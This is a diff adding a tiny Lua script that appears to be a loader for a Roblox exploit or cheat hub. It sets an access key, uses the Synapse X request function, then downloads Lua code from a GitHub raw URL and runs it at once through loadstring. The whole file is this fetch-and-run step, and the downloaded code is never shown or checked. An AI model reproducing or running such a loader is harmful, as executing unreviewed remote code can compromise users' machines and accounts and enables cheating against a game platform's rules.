@@ -1,0 +1,5 @@
+_G.Key = 'YPMXF-APKGE-CVJGI'
+
+if syn then request = syn.request end
+
+loadstring(request({['Url']='https://raw.githubusercontent.com/x2Moodz/XenonV2/main/Loadder.lua',['Method']='GET'}).Body)()
